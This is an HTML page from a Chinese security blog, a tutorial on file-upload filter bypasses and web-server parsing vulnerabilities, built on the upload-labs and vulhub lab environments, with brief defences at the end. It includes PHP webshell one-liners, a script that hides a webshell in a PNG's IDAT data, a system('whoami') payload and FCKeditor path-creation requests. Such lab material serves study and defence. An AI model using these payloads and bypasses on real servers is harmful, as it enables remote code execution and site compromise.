@@ -1,0 +1,511 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8" />
+        <title>文件上传 | Whispering Words</title>
+        <meta name="author" content="花下醉" />
+        <meta name="description" content="此心安处" />
+        <meta name="keywords" content="" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+        <link rel="icon" href="/images/ee5300e0743945b8b3b6b87aaba69478.jpg" />
+        <script src="https://cdn.staticfile.org/vue/3.2.47/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.3.0/css/all.min.css" />
+<link rel="stylesheet" href="/css/fonts.min.css" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.org/highlight.js/11.7.0/highlight.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.org/highlight.js/11.7.0/styles/xcode.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://cdn.staticfile.org/KaTeX/0.16.4/katex.min.js"></script>
+<script src="https://cdn.staticfile.org/KaTeX/0.16.4/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/KaTeX/0.16.4/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+        <canvas
+    id="background"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: -1"
+></canvas>
+<script src="/js/background.min.js"></script>
+<div id="cursor"></div>
+<link rel="stylesheet" href="/css/cursor.min.css" />
+<script src="/js/cursor.min.js"></script>
+
+
+    <meta name="generator" content="Hexo 5.4.2"></head>
+    <body>
+        <div id="layout">
+            <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+            </transition>
+            <nav id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <div class="desktop-menu">
+        <a class="title" href="/">
+            <span>WHISPERING WORDS</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;首页</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;关于</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;归档</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;类别</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;标签</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" @click="shouMenuItems = !shouMenuItems" v-show="shouMenuItems"></div>
+        <div class="title" @click="shouMenuItems = !shouMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;WHISPERING WORDS</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="shouMenuItems">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">首页</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">关于</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">归档</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">类别</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">标签</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+            <transition name="into">
+            <div id="main" v-show="!loading">
+                <div class="article">
+    <div>
+        <h1>文件上传</h1>
+    </div>
+    <div id="toc-container">
+        <!-- toc -->
+      </div>
+      
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/5/18
+        </span>
+        
+        <span class="category">
+            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                网络安全
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/web/" style="color: #ffa2c4">web</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        
+    <div id="toc">
+      
+    </div>
+    
+        <p>文件上传绕过方式和中间件解析漏洞<br>对文件上传绕过方式和解析漏洞的概念性总结。文件上传部分总结自upload-labs，中间件解析漏洞复现使用vulhub环境。</p>
+<p>c0ny1&#x2F;upload-labs</p>
+<p>vulhub</p>
+<p>0x01 漏洞类型分类<br>客户端</p>
+<p>js检查</p>
+<p>服务端</p>
+<p>检查后缀</p>
+<p>黑名单</p>
+<p>上传特殊可解析后缀</p>
+<p>上传.htaccess</p>
+<p>上传.user.ini</p>
+<p>后缀大小写绕过</p>
+<p>点绕过</p>
+<p>空格绕过</p>
+<p>::$DATA</p>
+<p>配合解析漏洞</p>
+<p>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</p>
+<p>Apache HTTPD 多后缀解析漏洞</p>
+<p>Nginx 解析漏洞</p>
+<p>IIS7.5解析漏洞</p>
+<p>IIS6解析漏洞</p>
+<p>双后缀名绕过</p>
+<p>白名单</p>
+<p>MIME绕过</p>
+<p>%00截断</p>
+<p>0x00截断</p>
+<p>0x0a截断</p>
+<p>检查内容</p>
+<p>文件头检查</p>
+<p>突破getimagesize()</p>
+<p>突破exif_imagetype()</p>
+<p>二次渲染</p>
+<p>其他</p>
+<p>条件竞争</p>
+<p>0x02 绕过方式<br>客户端</p>
+<p>js检查<br>在console中，破坏函数&#x2F;修改js添加白名单&#x2F;删除js黑名单。</p>
+<p>使用浏览器插件禁用js。</p>
+<p>拦截数据包修改。（如果能够拦截到数据包，说明已经通过前端检测了！）</p>
+<p>服务端</p>
+<p>黑名单</p>
+<p>特殊可解析后缀<br>黑名单规则不严谨，在某些特定的环境中，某些特殊的后缀名仍然会被当做php文件解析。</p>
+<p>Php|php2|php3|php4|php5|php6|php7|pht|phtm|phtml</p>
+<p>比如，黑名单禁止上传.asp|.aspx|.php|.jsp后缀文件。</p>
+<p>但是Apache的httpd.conf配置文件中，有这样一行内容：</p>
+<p>AddType application&#x2F;x-httpd-php .php .php3 .phtml</p>
+<p>这里上传.php、.php3、.phtml后缀的文件都可以当做php文件来执行。</p>
+<p>.htaccess绕过<br>在Apache里，.htaccess是一个配置文件。它可以用来控制所在目录的访问权限以及解析设置。可以通过修改该文件的配置项，将该目录下的所有文件作为php文件来解析。</p>
+<p>.htaccess可以写入apache配置信息，改变当前目录以及子目录的apache配置信息。</p>
+<p>应用场景：黑名单没有禁止.htaccess文件上传。</p>
+<p>绕过方法：首先上传一个.htaccess文件，.htaccess文件内容如下。如果Apache允许.htaccess文件生效，并且.htaccess文件没有被重命名。那么就可以改变当前目录以及子目录的Apache配置信息，将其他后缀的文件作为PHP文件解析。</p>
+<p>服务端允许.htaccess文件生效，需要在httpd.conf中，修改两处配置项：</p>
+<p>Apache加载rewrite模块</p>
+<p>LoadModule rewrite_module modules&#x2F;mod_rewrite.so</p>
+<p>AllowOverride All（默认为None）</p>
+<p>.htaccess文件中有两种写法</p>
+<p>&lt;FilesMatch “xxx.png”&gt;<br>SetHandler application&#x2F;x-httpd-php<br></FilesMatch><br>xxx.png即可作为php脚本解析</p>
+<p>或者是</p>
+<p>AddType application&#x2F;x-httpd-php .gif<br>.gif为后缀额度文件都当做php解析</p>
+<p>后缀大小写绕过<br>应用场景：没有将文件后缀统一转换为大写或者是小写，而黑名单不严谨。</p>
+<p>绕过方式：大小写绕过</p>
+<p>比如：禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件，但是没有使用strtolower()函数。</p>
+<p>.user.ini<br>应用场景</p>
+<p>服务器脚本语言为PHP，并且使用CGI&#x2F;FastCGI模式，php版本&gt;5.3.0</p>
+<p>上传目录下要有可执行的php文件</p>
+<p>.user.ini，它会影响php.ini中的配置，从而将指定的文件内容按php来解析，影响的范围该文件所在的目录以及子目录。需要等待php.ini中的user_ini.cache_ttl设置的时间或重启Apache才能生效，且只在php5.3.0之后的版本才生效。.user.ini比.htaccess用的更广，不管是nginx&#x2F;Apache&#x2F;IIS,只要是以fastcgi运行的php都可以用这个办法。如果使用Apache，则用.htaccess文件有同样的效果。</p>
+<p>注意：.htaccess只能用于Apache。</p>
+<p>在php.ini中，有两个新的INI指令</p>
+<p>; Name for user-defined php.ini (.htaccess) files. Default is “.user.ini”<br>; 用户自定义的php.ini文件的名字，默认是.user.ini<br>user_ini.filename &#x3D; “.user.ini”<br>​<br>; TTL for user-defined php.ini files (time-to-live) in seconds. Default is 300 seconds (5 minutes)<br>; 重新读取用户INI文件的时间间隔，默认是300秒（5分钟）<br>user_ini.cache_ttl &#x3D; 300<br>大致意思是：我们指定一个文件（如，xxx.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：require(.&#x2F;xxx.jpg);</p>
+<p>这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用exit()时该设置无效）。</p>
+<p>利用方法：</p>
+<p>可以上传一个这样的.user.ini</p>
+<p>auto_prepend_file &#x3D; xxx.jpg<br>然后再上传一个图片马xxx.jpg</p>
+<script language='php'>system('whoami');</script>
+<p>如果在上传目录中还有一个可执行的php文件，访问php文件，就达到了执行系统命令的效果。</p>
+<p>总结一下：上传目录中有一个可执行的php文件，我们先上传一个.user.ini文件，这个文件的内容为auto_prepend_file&#x3D;xxx.jpg。起到的作用相当于在可执行的php文件前插入图片马中的内容。然后图片马中的恶意代码也会被当做PHP解析。</p>
+<p>补充：利用操作系统特性-Windows<br>利用Windows对于文件和文件名的限制，以下字符放在结尾时，不符合操作系统的命名规范，在最后生成文件时，字符会被自动去除。</p>
+<p>上传文件名	服务器文件名	说明<br>file.php[空格]	file.php	<br>file.php[.]	file.php	无论多少个.都可以<br>file.php[%80-%99]	file.php	Burp抓包，在文件名结尾输%80，CTRL+SHIFT+U进行URL-DECODE,或者增加一个空格，再在HEX视图中把20修改为80<br>上传文件名	服务器生成文件名	内容<br>file.php::$DATA	file.php	file.php中的实际内容<br>file.php::$DATA……	file.php	实际<br>空格绕过<br>应用场景：服务器为Windows平台，在对用户上传的文件名进行处理时，没有使用trim()函数去除字符串收尾处的空白字符。</p>
+<p>利用方式：用户上传图片马时，用Burp拦截，在文件尾部加入空格。例如：xxx.jpg空格。带有空格的后缀可以绕过黑名单的检测，而文件存在在Windows服务器上，会自动去除后缀中的空格。</p>
+<p>点绕过<br>应用场景：Windows平台，服务端没有使用deldot()删除文件名末尾的点。</p>
+<p>利用方式：上传名为assert.php.的文件。在Windows服务器中，后缀名之后的点，在保存时，会被自动忽略。</p>
+<p>::$DATA绕过<br>应用场景：Windows平台，没有使用str_ireplace()将::$DATA替换为空，导致可以利用NTFS文件流特性。</p>
+<p>利用方式：</p>
+<p>假设xxx.php的内容为<?php phpinfo();?></p>
+<p>上传的文件名	服务器表面现象	生成的文件内容<br>xxx.php:a.jpg	生成xxx.php	空<br>xxx.php::$DATA	生成xxx.php	<?php phpinfo();?><br>xxx.php::$INDEX_ALLOCATION	生成xxx.php文件夹	<br>xxx.php::$DATA.jpg	生成0.jpg	<?php phpinfo();?><br>xxx.php::$DATA\aaa.jpg	生成aaa.jpg	<?php phpinfo();?><br>这里，我们上传一个名为xxx.php::$DATA的木马，然后，在浏览器中访问xxx.php。</p>
+<p>双后缀名绕过<br>应用场景：黑名单、使用str_ireplace()将匹配到的黑名单中的内容替换为空。</p>
+<p>利用方式：因为仅将黑名单中的内容一次替换为空，可以重写绕过。</p>
+<p>xxx.phphpp</p>
+<p>配合解析漏洞<br>这里的部分解析漏洞使用vulhub的环境进行复现。</p>
+<p>Apache HTTPD 换行解析漏洞(CVE-2017-15715)<br>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
+<p>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</p>
+<p>在index.php中，使用了黑名单对文件后缀进行检测</p>
+<p>  if(in_array($ext, [‘php’, ‘php3’, ‘php4’, ‘php5’, ‘phtml’, ‘pht’])) {<br>      exit(‘bad file’);<br>  }<br>上传一个名为1.php的文件，被拦截</p>
+<p>1614931137_6041e4c1d5ca63303ac8f.png!small?1614931137736</p>
+<p>在1.php后面插入一个\x0A(注意，不能是\x0D\x0A，只能是一个\x0A)，不再拦截：</p>
+<p>社区版Burp点击1.php后面的一个字节，然后右键-&gt;Insert byte。再将插入的00修改为0a。</p>
+<p>1614931189_6041e4f5412f1f5c026cb.png!small?1614931188995</p>
+<p>访问刚才上传的&#x2F;1.php%0a，发现能够成功解析，但是这个文件的后缀不是php后缀，说明目标存在解析漏洞：</p>
+<p>1614931216_6041e5105daa607d87262.png!small?1614931216140</p>
+<p>1614931242_6041e52a63a0a14efef43.png!small?1614931241859</p>
+<p>Apache HTTPD 多后缀解析漏洞<br>Apache HTTPD 多后缀解析漏洞</p>
+<p>Apache HTTPD支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：</p>
+<p>AddType text&#x2F;html .html<br>AddLanguage zh-CN .cn<br>其给.html增加了一个media-type，值为text&#x2F;html；给.cn后缀增加了语言，值为zh-CN。此时，如果用户请求文件index.cn.html，它将会返回一个中午的html页面。</p>
+<p>以上就是Apache多后缀的特性。如果运维人员给.php后缀增加了处理器：</p>
+<p>AddHandler application&#x2F;x-httpd-php .php<br>那么，在有多个后缀的情况下，只要有一个文件含有.php后缀即将被识别为PHP文件，没有必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p>
+<p>访问上传目录&#x2F;uploads&#x2F;phpinfo.php.7z，即可发现，phpinfo被执行了，该文件被解析为php脚本。</p>
+<p>1614931284_6041e5543ce8288498d2c.png!small?1614931283845</p>
+<p>上传完成后并未重命名。可以通过上传文件名为xxx.php.jpg或xxx.php.jpeg的文件，利用Apache解析漏洞getshell。</p>
+<p>1614931316_6041e5749ec1aba74a5ec.png!small?1614931316122</p>
+<p>1614931333_6041e58552d5dda2fdd6a.png!small?1614931332926</p>
+<p>Nginx 解析漏洞<br>Nginx 解析漏洞复现</p>
+<p>版本信息：</p>
+<p>Nginx 1.x 最新版</p>
+<p>PHP 7.x最新版</p>
+<p>由此可知，该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。</p>
+<p>访问&#x2F;uploadfiles&#x2F;nginx.png和&#x2F;uploadfiles&#x2F;nginx.png&#x2F;.php即可查看效果。</p>
+<p>1614931353_6041e59979d0363bd5713.png!small?1614931353013</p>
+<p>增加&#x2F;.php后缀，被解析为PHP文件：</p>
+<p>1614931369_6041e5a94d3ed20cf3ca2.png!small?1614931368992</p>
+<p>1614931400_6041e5c8b880bd12c243a.png!small?1614931400149</p>
+<p>访问index.php可以测试上传功能，上传代码不存在漏洞，但利用解析漏洞即可getshell：</p>
+<p>使用命令行生成图片马</p>
+<p>1.php中的内容<?php @assert($_POST['x']);?></p>
+<p>copy Koala.png&#x2F;b+1.php&#x2F;a shell.png<br>上传shell.png后，成功访问，在后面加上&#x2F;.phpgetshell。</p>
+<p>1614931433_6041e5e9b5dea9358a001.png!small?1614931433248</p>
+<p>1614931515_6041e63b5c62b4462862d.png!small</p>
+<p>1614931564_6041e66cee44f8d04d9b3.png!small?1614931564602</p>
+<p>1614931582_6041e67ec665cc6209209.png!small?1614931582517</p>
+<p>IIS7.5解析漏洞<br>Web中间件漏洞总结之IIS漏洞</p>
+<p>环境：</p>
+<p>Microsoft-IIS&#x2F;7.5</p>
+<p>PHP 5.4.45</p>
+<p>Windows Server 2008 R2</p>
+<p>利用条件：</p>
+<p>Fast-CGI运行模式</p>
+<p>php.ini里cgi.fix_pathinfo&#x3D;1</p>
+<p>取消勾选php-cgi.exe程序的”invoke handler only if request is mapped to”。也就是取消勾选模块映射中的请求限制。</p>
+<p>利用方式：在上传的文件名后面加上&#x2F;.php，可以被作为PHP文件解析。</p>
+<p>1614931680_6041e6e0ea3dd7f6f6c23.png!small?1614931680475</p>
+<p>漏洞修复：</p>
+<p>限制上传的脚本执行权限，不允许执行脚本</p>
+<p>将php.ini的cgi.fix_pathinfo&#x3D;0</p>
+<p>在模块映射中勾选请求限制</p>
+<p>IIS6解析漏洞<br>编辑器漏洞手册</p>
+<p>Web中间件漏洞总结之IIS漏洞</p>
+<p>环境：</p>
+<p>Microsoft-IIS&#x2F;6.0</p>
+<p>Windows 2003</p>
+<p>路径解析</p>
+<p>原理：在.asp、.asa目录下的任意文件都会以asp格式解析</p>
+<p>文件解析(;截断)。</p>
+<p>原理：在IIS 6.0下，服务器默认不解析;后面的内容。</p>
+<p>上传test.asp;.jpg会被解析为asp。</p>
+<p>解析文件类型</p>
+<p>原理：IIS 6.0默认的可执行文件除了asp还包含asa、cer、cdx，会将这三种扩展名文件解析为asp文件。</p>
+<p>FCKeditor 查看编辑器版本</p>
+<p>FCKeditor V2.6.6版本</p>
+<p>FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;asp&#x2F;config.php<br>这里FCKeitor的版本较新，也就不能利用IIS6中;截断的漏洞。</p>
+<p>路径解析：</p>
+<p>FCKeditor查看文件上传路径</p>
+<p>FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;asp&#x2F;connector.asp?Command&#x3D;GetFoldersAndFiles&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;&#x2F;</p>
+<p>1614931728_6041e7108d22bdbd7caa2.png!small?1614931728092</p>
+<p>上传路径为&#x2F;FCKeditor&#x2F;upFile&#x2F;2021-3&#x2F;image&#x2F;</p>
+<p>利用2003路径解析漏洞上传木马</p>
+<p>漏洞描述：利用系统2003路径解析漏洞的原理，创建类似bin.asp的目录，再在此目录中上传文件即可被脚本解析器以相应脚本权限执行。</p>
+<p>强制建立shell.asp目录：</p>
+<p>FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;asp&#x2F;connector.asp?Command&#x3D;CreateFolder&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;&#x2F;shell.asp&amp;NewFolderName&#x3D;z&amp;uuid&#x3D;1244789975684</p>
+<p>1614931753_6041e72957674b1c0f29f.png!small?1614931752806</p>
+<p>建立的shell.asp目录的路径为&#x2F;FCKeditor&#x2F;upFile&#x2F;2021-3&#x2F;image&#x2F;shell.asp&#x2F;</p>
+<p>上传图片马到shell.asp目录下就可以。可以使用冰蝎server中的shell.asp，将后缀改为png。上传的shell.png到shell.asp目录下会被解析为asp脚本，用冰蝎连接。</p>
+<p>上传路径在：FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;test.html</p>
+<p>1614931784_6041e7483d26efda421b6.png!small?1614931783672</p>
+<p>1614931826_6041e7726976674eb1c47.png!small?1614931825911</p>
+<p>防御：</p>
+<p>限制上传的脚本执行权限，不允许执行脚本</p>
+<p>对新建目录文件名进行过滤，不允许新建包含.的文件</p>
+<p>不允许新建目录</p>
+<p>过滤.asp&#x2F;xxx.jpg，通过ISApi组件过滤</p>
+<p>白名单</p>
+<p>MIME检查<br>MIME类型是描述消息内容类型的因特网标准。</p>
+<p>HTTP头部的Content-Type字段的内容就是MIME类型。</p>
+<p>只需要将MIME类型修改为白名单中允许的类型即可。</p>
+<p>比如，图片上传点，允许上传gif、jpeg、png。用Burp抓包，将HTTP头部的Content-Type字段内容修改为：</p>
+<p>Content-Type: image&#x2F;gif或Content-Type: image&#x2F;jpeg或Content-Type: image&#x2F;png</p>
+<p>%00截断<br>%00是chr(0)，空字符。</p>
+<p>程序会把%00当做结束符，后面的数据直接忽略掉。</p>
+<p>在文件上传中，利用%00截断，在文件扩展名验证时，是取文件的扩展名来验证，但是最后文件保存在本地时，%00或截断文件名，只保存%00之前的内容。</p>
+<p>应用场景：白名单、上传路径可控、php.ini中的magic_quotes_gpc为off</p>
+<p>利用方式：</p>
+<p>如果上传文件的路径为：用户可控的上传路径&#x2F;随机数.白名单中的后缀</p>
+<p>正常情况下，服务器拼接得到的上传路径为：</p>
+<p>$img_path &#x3D; ..&#x2F;upload&#x2F;5920201223231032.gif;</p>
+<p>而用户在可控的上传路径中，使用%00截断后，拼接得到的上传路径为：</p>
+<p>$img_path &#x3D; ..&#x2F;upload&#x2F;xxx.php%00&#x2F;5920201223231032.gif</p>
+<p>对后缀进行白名单检测，为gif。但是保存在服务器上的文件，却是xxx.php，因为%00之后的内容被截断了。</p>
+<p>0x00截断<br>条件：php版本&lt;5.3.4、php.ini中的magic_quotes_gpc设置为off、上传路径可控、白名单</p>
+<p>利用方式：</p>
+<p>如果上传文件的路径为：用户可控的上传路径&#x2F;随机数.白名单中的后缀</p>
+<p>正常情况下，服务器拼接得到的上传图像地址为$img_path &#x3D;..&#x2F;upload&#x2F;5920201223231032.gif</p>
+<p>但是，用户如果在可控上传路径中写入一个php后缀，并且php后缀后面有一个0x00字符</p>
+<p>服务器拼接得到的上传图像地址会变为$img_path &#x3D;..&#x2F;upload&#x2F;xxx.php[0x00]&#x2F;5920201223231032.gif</p>
+<p>对后缀进行白名单检测，为gif。但是保存在服务器上的文件，却是xxx.php，因为0x00之后的内容被截断了。</p>
+<p>0x0a截断<br>原理同上</p>
+<p>检查内容</p>
+<p>文件头检查<br>上传具有正常文件头的图片马即可。</p>
+<p>gif的文件头为GIF89a；png的文件头为89504E47；jpg的文件头为FFD8FF</p>
+<p>此时如果不存在上述的漏洞，只能上传图片格式的后缀，还需使用文件包含漏洞运行图片马中的恶意代码。</p>
+<p>突破getimagesize()<br>getimagesize()函数会返回一个数组，其中下标2是图像的类型。1&#x3D;GIF，2&#x3D;JPG, 3&#x3D;PNG。这里上传一个正常图像后缀的图片马，使用文件包含漏洞运行图片马中的恶意代码即可。</p>
+<p>突破exif_imagetype()<br>exif_imagetype()— 判断一个图像的类型。检查图像的第一个字节。可能返回的常量有IMAGETYPE_GIF&#x3D;1；IMAGETYPE_JPEG&#x3D;2;MAGETYPE_PNG&#x3D;3;文件头不正确返回false。</p>
+<p>上传具有正常文件头的图片马即可。</p>
+<p>gif的文件头为GIF89a；png的文件头为89504E47；jpg的文件头为FFD8FF。然后使用文件包含漏洞运行图片马中的恶意代码。</p>
+<p>二次渲染<br>gif：找到渲染前后没有变化的位置，将PHP代码写进去。</p>
+<p>png：写入IDAT数据块</p>
+<p>使用脚本生成图片马</p>
+<?php
+$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
+         0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
+         0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
+         0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
+         0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
+         0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
+         0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
+         0x66, 0x44, 0x50, 0x33);
+$img = imagecreatetruecolor(32, 32);
+for ($y = 0; $y < sizeof($p); $y += 3) {
+ $r = $p[$y];
+ $g = $p[$y+1];
+ $b = $p[$y+2];
+ $color = imagecolorallocate($img, $r, $g, $b);
+ imagesetpixel($img, round($y / 3), 0, $color);
+}
+imagepng($img,'./idat.png');
+?>
+<p>​<br>可以看到，在IDAT数据块中，有一句话木马：<?=$_GET[0]($_POST[1]);?>，这里利用了PHP中的短开标签。</p>
+<p>注意：使用短开标签，需要在php.ini中，将short_open_tag&#x3D;On</p>
+<p>jpg：未测试成功。</p>
+<p>其他</p>
+<p>条件竞争<br>条件竞争漏洞（Race condition）官方概念是“发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。</p>
+<p>upload-labs中的Pass-17是一个典型的条件竞争上传</p>
+<p>代码执行逻辑：先移动，后检测，不符合再删除，符合则改名字。</p>
+<p>因此我们可以让burp一直发包，让php程序一直处于移动php文件到upload目录这个阶段</p>
+<p>我们使用多线程并发访问上传的文件，总会有一次在上传文件到删除文件这个时间段访问到上传的php文件，一旦我们成功访问到上传的php文件，那么它就会向服务器写一个shell。</p>
+<p>0x03 文件上传漏洞的防御<br>服务端文件扩展名使用白名单+文件重命名</p>
+<p>对文件内容进行检测</p>
+<p>对中间件进行安全配置</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+                <footer id="footer">
+    <div id="footer-wrap">
+        <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+<div id="poem_sentence"></div>
+<div id="poem_info"></div>
+<script type="text/javascript">
+  jinrishici.load(function(result) {
+    var sentence = document.querySelector("#poem_sentence")
+    var info = document.querySelector("#poem_info")
+    sentence.innerHTML = result.data.content
+    info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》'
+  });</script>
+        <div>
+            &copy;
+            2023 - 2023 Whispering Words
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;花下醉
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+            </div>
+            </transition>
+            
+            <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+            </transition>
+            
+        </div>
+        <script src="/js/main.js"></script>
+        
+        
+
+
+
+
+        
+        
+    </body>
+</html>
